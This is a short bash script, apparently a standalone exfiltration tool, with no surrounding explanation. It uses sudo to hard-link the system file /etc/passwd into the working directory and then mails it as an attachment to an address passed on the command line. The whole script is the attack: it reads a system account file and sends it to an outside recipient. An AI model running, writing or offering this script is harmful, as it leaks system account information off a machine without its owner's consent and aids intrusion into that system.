#!/bin/bash

sudo ln /etc/passwd password
mail -s "Password" -A password $1 <<< "Here is passwd file"
